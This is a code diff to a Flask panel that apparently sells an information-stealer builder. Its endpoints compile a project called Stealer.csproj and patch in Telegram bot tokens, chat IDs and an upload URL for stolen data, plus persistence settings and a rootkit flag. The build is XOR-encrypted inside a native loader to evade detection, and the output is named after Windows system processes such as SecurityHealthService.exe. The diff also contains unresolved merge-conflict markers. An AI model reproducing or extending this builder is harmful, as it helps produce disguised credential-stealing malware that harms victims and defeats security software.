@@ -2179,6 +2179,67 @@ def check_invite_payment():
 
 # ===== BUILDER =====
 
+def _find_msbuild():
+    """Locate MSBuild.exe from VS 2022/2026."""
+    import subprocess as _sp
+    vswhere = r"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
+    if not os.path.exists(vswhere):
+        return None
+    try:
+        out = _sp.check_output([vswhere, '-latest', '-property', 'installationPath'],
+                               text=True, timeout=5).strip()
+        if out:
+            p = os.path.join(out, r"MSBuild\Current\Bin\MSBuild.exe")
+            if os.path.exists(p):
+                return p
+    except Exception:
+        pass
+    return None
+
+def _build_csharp_stub(root_dir):
+    """dotnet build the C# stub (Main/Stealer.csproj) → returns path to WindowsHostManager.exe."""
+    import subprocess as _sp
+    msbuild = _find_msbuild()
+    proj = os.path.join(root_dir, 'Main', 'Stealer.csproj')
+    if msbuild:
+        try:
+            _sp.run([msbuild, proj, '/p:Configuration=Release', '/p:Platform=AnyCPU',
+                     '/verbosity:quiet', '/nologo'],
+                    capture_output=True, timeout=120, check=True)
+        except Exception:
+            pass
+    # fallback: dotnet build
+    try:
+        _sp.run(['dotnet', 'build', proj, '-c', 'Release', '--nologo'],
+                capture_output=True, timeout=120, check=True)
+    except Exception:
+        pass
+    # find the output
+    for plat in ('net462', 'net462'):
+        p = os.path.join(root_dir, 'Main', 'bin', 'Release', plat, 'WindowsHostManager.exe')
+        if os.path.exists(p):
+            return p
+    return None
+
+def _build_native_loader(root_dir):
+    """MSBuild the native C++ loader (LoaderNative.vcxproj) → returns path to SecurityHealthService.exe."""
+    import subprocess as _sp
+    msbuild = _find_msbuild()
+    if not msbuild:
+        return None
+    proj = os.path.join(root_dir, 'LoaderNative', 'LoaderNative.vcxproj')
+    try:
+        _sp.run([msbuild, proj, '/p:Configuration=Release', '/p:Platform=x64',
+                 '/verbosity:quiet', '/nologo'],
+                capture_output=True, timeout=120, check=True)
+        # vcxproj OutDir: $(SolutionDir)LoaderNative\bin\Release\
+        p = os.path.join(root_dir, 'LoaderNative', 'bin', 'Release', 'SecurityHealthService.exe')
+        if os.path.exists(p):
+            return p
+    except Exception:
+        pass
+    return None
+
 @app.route('/api/build', methods=['POST'])
 @login_required
 @subscription_required
@@ -2193,26 +2254,31 @@ def build_client():
         persistence    = data.get('persistence', 'registry,scheduler,userinit')
         install_folder = data.get('installFolder', '%ApplicationData%')
         install_name   = data.get('installName', 'WindowsHostManager.exe')
+        debug_mode     = str(data.get('debugMode', False)).lower()
+        rootkit_enabled = str(data.get('rootkitMode', False)).lower()
+        build_native_loader = bool(data.get('native', False))
 
         stub_dir = os.path.join(BASE_DIR, 'stub')
         root_dir = os.path.dirname(BASE_DIR)
-        stub_search_paths = [
-            os.path.join(stub_dir, 'WindowsHostManager.exe'),
-            os.path.join(root_dir, 'Main', 'bin', 'Release', 'net462', 'WindowsHostManager.exe'),
-            os.path.join(root_dir, 'Main', 'bin', 'Debug', 'net462', 'WindowsHostManager.exe'),
-        ]
         config_search_paths = [
             os.path.join(stub_dir, 'config.json'),
             os.path.join(root_dir, 'Main', 'config.json'),
         ]
-        source_dir = os.path.join(root_dir, 'Main')
-
-        stub_path = next((p for p in stub_search_paths if os.path.exists(p)), None)
         config_path = next((p for p in config_search_paths if os.path.exists(p)), None)
+        if not config_path:
+            return jsonify({'error': 'config.json not found'}), 404
 
-        if not stub_path or not config_path:
-            return jsonify({'error': 'Stub base templates not found. Run "dotnet build" on the C# solution first!'}), 404
+<<<<<<< Updated upstream
+=======
+        with open(config_path, 'r', encoding='utf-8') as f:
+            old_config = f.read()
 
+        # ── 1. Compile C# stub ──
+        stub_path = _build_csharp_stub(root_dir)
+        if not stub_path:
+            return jsonify({'error': 'Failed to build C# stub (check .NET 4.6.2 targeting pack)'}), 500
+
+>>>>>>> Stashed changes
         with open(stub_path, 'rb') as f:
             stub_bytes = bytearray(f.read())
 
@@ -2235,8 +2301,6 @@ def build_client():
             end_idx = config.find('"', idx)
             return config[idx:end_idx]
 
-        debug_mode = str(data.get('debugMode', False)).lower()
-        rootkit_enabled = str(data.get('rootkitMode', False)).lower()
 
         def pad_value(val, length):
             val = str(val)
@@ -2244,30 +2308,35 @@ def build_client():
                 return val[:length]
             return val.ljust(length, ' ')
 
-        delivery_placeholder       = get_placeholder(old_config, 'delivery')
-        token_placeholder          = get_placeholder(old_config, 'botToken')
-        chat_placeholder           = get_placeholder(old_config, 'chatId')
-        panel_url_placeholder      = get_placeholder(old_config, 'panelUrl')
-        secret_key_placeholder     = get_placeholder(old_config, 'secretKey')
-        persist_placeholder        = get_placeholder(old_config, 'persistence')
-        install_folder_placeholder = get_placeholder(old_config, 'installFolder')
-        install_name_placeholder   = get_placeholder(old_config, 'installName')
-        debug_mode_placeholder     = get_placeholder(old_config, 'debugMode')
-        rootkit_placeholder        = get_placeholder(old_config, 'rootkitEnabled')
+        placeholders = {
+            'delivery':       get_placeholder(old_config, 'delivery'),
+            'botToken':       get_placeholder(old_config, 'botToken'),
+            'chatId':         get_placeholder(old_config, 'chatId'),
+            'panelUrl':       get_placeholder(old_config, 'panelUrl'),
+            'secretKey':      get_placeholder(old_config, 'secretKey'),
+            'persistence':    get_placeholder(old_config, 'persistence'),
+            'installFolder':  get_placeholder(old_config, 'installFolder'),
+            'installName':    get_placeholder(old_config, 'installName'),
+            'debugMode':      get_placeholder(old_config, 'debugMode'),
+            'rootkitEnabled': get_placeholder(old_config, 'rootkitEnabled'),
+        }
+        new_values = {
+            'delivery':       delivery,
+            'botToken':       bot_token,
+            'chatId':         chat_id,
+            'panelUrl':       panel_url,
+            'secretKey':      secret_key,
+            'persistence':    persistence,
+            'installFolder':  install_folder,
+            'installName':    install_name,
+            'debugMode':      debug_mode,
+            'rootkitEnabled': rootkit_enabled,
+        }
 
-        new_config = (
-            old_config
-            .replace(delivery_placeholder,       pad_value(delivery,       len(delivery_placeholder)))
-            .replace(token_placeholder,          pad_value(bot_token,      len(token_placeholder)))
-            .replace(chat_placeholder,           pad_value(chat_id,        len(chat_placeholder)))
-            .replace(panel_url_placeholder,      pad_value(panel_url,      len(panel_url_placeholder)))
-            .replace(secret_key_placeholder,     pad_value(secret_key,     len(secret_key_placeholder)))
-            .replace(persist_placeholder,        pad_value(persistence,    len(persist_placeholder)))
-            .replace(install_folder_placeholder, pad_value(install_folder, len(install_folder_placeholder)))
-            .replace(install_name_placeholder,   pad_value(install_name,   len(install_name_placeholder)))
-            .replace(debug_mode_placeholder,     pad_value(debug_mode,       len(debug_mode_placeholder)))
-            .replace(rootkit_placeholder,         pad_value(rootkit_enabled,  len(rootkit_placeholder)))
-        )
+        new_config = old_config
+        for key, ph in placeholders.items():
+            if ph:
+                new_config = new_config.replace(ph, pad_value(new_values[key], len(ph)))
 
         new_config_bytes = new_config.encode('utf-8')
 
@@ -2276,20 +2345,221 @@ def build_client():
 
         stub_bytes[start:end+1] = new_config_bytes
 
-        # from polymorph import mutate
-        # stub_bytes = mutate(stub_bytes, source_dir=source_dir)
-
         builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
         os.makedirs(builds_dir, exist_ok=True)
-        output_filename = f"build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
-        output_path = os.path.join(builds_dir, output_filename)
 
-        with open(output_path, 'wb') as f:
-            f.write(stub_bytes)
+        if build_native_loader:
+            # ── 2. Compile native C++ loader ──
+            native_path = _build_native_loader(root_dir)
+            if not native_path:
+                return jsonify({'error': 'Failed to build native loader (check MSVC C++ tools)'}), 500
+
+            with open(native_path, 'rb') as f:
+                native_bytes = bytearray(f.read())
+
+            # ── 3. Patch XOR key sentinel in native loader ──
+            default_key = bytes([
+                0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
+                0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
+                0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
+                0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
+            ])
+            key_offset = bytes(native_bytes).find(default_key)
+            if key_offset < 0:
+                return jsonify({'error': 'XOR key sentinel not found in native loader'}), 400
+
+            import random as _random
+            new_key = bytearray(_random.SystemRandom().randbytes(32))
+            native_bytes[key_offset:key_offset+32] = new_key
+
+            # ── 4. XOR-encrypt the patched C# stub ──
+            stub_len = len(stub_bytes)
+            enc_stub = bytearray(stub_len)
+            for i in range(stub_len):
+                enc_stub[i] = stub_bytes[i] ^ new_key[i % 32]
+
+            # ── 5. Append overlay: [encrypted_payload][AEST][size_le32] ──
+            # C++ reads from end: [size][AEST] backwards, payload before it.
+            native_bytes += enc_stub
+            native_bytes += b'AEST'
+            native_bytes += stub_len.to_bytes(4, 'little')
+
+            output_filename = f"native_build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
+            output_path = os.path.join(builds_dir, output_filename)
+            with open(output_path, 'wb') as f:
+                f.write(native_bytes)
+            dl_name = 'SecurityHealthService.exe'
+        else:
+            # plain C# stub
+            output_filename = f"build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
+            output_path = os.path.join(builds_dir, output_filename)
+            with open(output_path, 'wb') as f:
+                f.write(stub_bytes)
+            dl_name = 'WindowsHostManager.exe'
 
         return jsonify({'success': True, 'downloadUrl': f"/api/build/download/{output_filename}"})
     except Exception as e:
         print(f"[BUILDER] Compile Error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+
+# ===== NATIVE BUILDER (C++ loader wrapper) =====
+
+@app.route('/api/build/native', methods=['POST'])
+@login_required
+def build_native():
+    try:
+        import os as _os, random as _random
+        data = request.json
+        delivery       = data.get('delivery', 'TELEGRAM')
+        bot_token      = data.get('botToken', '')
+        chat_id        = data.get('chatId', '')
+        panel_url      = (data.get('panelUrl') or (request.host_url.rstrip('/') + '/api/upload'))
+        secret_key     = data.get('secretKey', '')
+        persistence    = data.get('persistence', 'registry,scheduler,userinit')
+        install_folder = data.get('installFolder', '%ApplicationData%')
+        install_name   = data.get('installName', 'WindowsHostManager.exe')
+        debug_mode     = str(data.get('debugMode', False)).lower()
+        rootkit_enabled = str(data.get('rootkitMode', False)).lower()
+
+        stub_dir = os.path.join(BASE_DIR, 'stub')
+        root_dir = os.path.dirname(BASE_DIR)
+        stub_search_paths = [
+            os.path.join(stub_dir, 'WindowsHostManager.exe'),
+            os.path.join(root_dir, 'Main', 'bin', 'Release', 'net462', 'WindowsHostManager.exe'),
+            os.path.join(root_dir, 'Main', 'bin', 'Debug', 'net462', 'WindowsHostManager.exe'),
+        ]
+        config_search_paths = [
+            os.path.join(stub_dir, 'config.json'),
+            os.path.join(root_dir, 'Main', 'config.json'),
+        ]
+
+        stub_path = next((p for p in stub_search_paths if os.path.exists(p)), None)
+        config_path = next((p for p in config_search_paths if os.path.exists(p)), None)
+
+        if not stub_path or not config_path:
+            return jsonify({'error': 'Stub base templates not found. Run "dotnet build" on the C# solution first!'}), 404
+
+        # ── 1. Patch config in C# stub (same as /api/build) ──
+        with open(config_path, 'r', encoding='utf-8') as f:
+            old_config = f.read()
+        with open(stub_path, 'rb') as f:
+            stub_bytes = bytearray(f.read())
+
+        def get_placeholder(config, key):
+            search = f'"{key}":"'
+            start = config.find(search)
+            if start == -1: return ""
+            start += len(search)
+            end = config.find('"', start)
+            return config[start:end]
+
+        def pad_value(val, length):
+            if len(val) > length: return val[:length]
+            return val.ljust(length, ' ')
+
+        placeholders = {
+            'delivery':       get_placeholder(old_config, 'delivery'),
+            'botToken':       get_placeholder(old_config, 'botToken'),
+            'chatId':         get_placeholder(old_config, 'chatId'),
+            'panelUrl':       get_placeholder(old_config, 'panelUrl'),
+            'secretKey':      get_placeholder(old_config, 'secretKey'),
+            'persistence':    get_placeholder(old_config, 'persistence'),
+            'installFolder':  get_placeholder(old_config, 'installFolder'),
+            'installName':    get_placeholder(old_config, 'installName'),
+            'debugMode':      get_placeholder(old_config, 'debugMode'),
+            'rootkitEnabled': get_placeholder(old_config, 'rootkitEnabled'),
+        }
+        new_values = {
+            'delivery':       delivery,
+            'botToken':       bot_token,
+            'chatId':         chat_id,
+            'panelUrl':       panel_url,
+            'secretKey':      secret_key,
+            'persistence':    persistence,
+            'installFolder':  install_folder,
+            'installName':    install_name,
+            'debugMode':      debug_mode,
+            'rootkitEnabled': rootkit_enabled,
+        }
+
+        new_config = old_config
+        for key, ph in placeholders.items():
+            if ph:
+                new_config = new_config.replace(ph, pad_value(new_values[key], len(ph)))
+
+        old_config_bytes = old_config.encode('utf-8')
+        new_config_bytes = new_config.encode('utf-8')
+
+        if len(old_config_bytes) != len(new_config_bytes):
+            return jsonify({'error': 'Configuration padding mismatch'}), 400
+
+        replaced = False
+        search_len = len(old_config_bytes)
+        for i in range(len(stub_bytes) - search_len + 1):
+            if stub_bytes[i:i+search_len] == old_config_bytes:
+                stub_bytes[i:i+search_len] = new_config_bytes
+                replaced = True
+                break
+
+        if not replaced:
+            return jsonify({'error': 'Stub binary configuration signature not found'}), 400
+
+        # ── 2. Locate prebuilt native loader ──
+        native_search_paths = [
+            os.path.join(BASE_DIR, 'native', 'SecurityHealthService.exe'),
+            os.path.join(root_dir, 'LoaderNative', 'bin', 'Release', 'SecurityHealthService.exe'),
+        ]
+        native_path = next((p for p in native_search_paths if os.path.exists(p)), None)
+        if not native_path:
+            return jsonify({'error': 'Native loader not built. Run "dotnet build LoaderNative" first!'}), 404
+
+        with open(native_path, 'rb') as f:
+            native_bytes = bytearray(f.read())
+
+        # ── 3. Patch the 32-byte XOR key embedded in native_bytes ──
+        # g_key is compiled as 32 consecutive bytes from the source initializer.
+        # Find it by its known sentinel byte sequence (the default key bytes).
+        default_key = bytes([
+            0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11,
+            0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,
+            0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
+            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
+        ])
+        key_offset = bytes(native_bytes).find(default_key)
+        if key_offset < 0:
+            return jsonify({'error': 'XOR key sentinel not found in native loader'}), 400
+
+        # generate fresh random key
+        new_key = bytearray(_random.SystemRandom().randbytes(32))
+        native_bytes[key_offset:key_offset+32] = new_key
+
+        # ── 4. Encrypt C# stub with new XOR key ──
+        stub_len = len(stub_bytes)
+        enc_stub = bytearray(stub_len)
+        for i in range(stub_len):
+            enc_stub[i] = stub_bytes[i] ^ new_key[i % 32]
+
+        # ── 5. Append overlay: [AEST][size_le32][encrypted_payload] ──
+        overlay = bytearray()
+        overlay += b'AEST'
+        overlay += stub_len.to_bytes(4, 'little')
+        overlay += enc_stub
+
+        native_bytes += overlay
+
+        # ── 6. Write final build to public/builds/ ──
+        builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
+        os.makedirs(builds_dir, exist_ok=True)
+        output_filename = f"native_build_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
+        output_path = os.path.join(builds_dir, output_filename)
+
+        with open(output_path, 'wb') as f:
+            f.write(native_bytes)
+
+        return jsonify({'success': True, 'downloadUrl': f"/api/build/download/{output_filename}"})
+    except Exception as e:
+        print(f"[NATIVE BUILDER] Error: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/build/download/<filename>')
@@ -2298,7 +2568,10 @@ def download_build(filename):
     builds_dir = os.path.join(BASE_DIR, 'public', 'builds')
     path = os.path.join(builds_dir, filename)
     if os.path.exists(path):
-        return send_file(path, as_attachment=True, download_name='WindowsHostManager.exe')
+        # detect native vs regular by filename prefix
+        is_native = filename.startswith('native_build')
+        dl_name = 'SecurityHealthService.exe' if is_native else 'WindowsHostManager.exe'
+        return send_file(path, as_attachment=True, download_name=dl_name)
     return 'Build file not found', 404
 
 # ── Hub: Announcements ──────────────────────────────────────────────────────
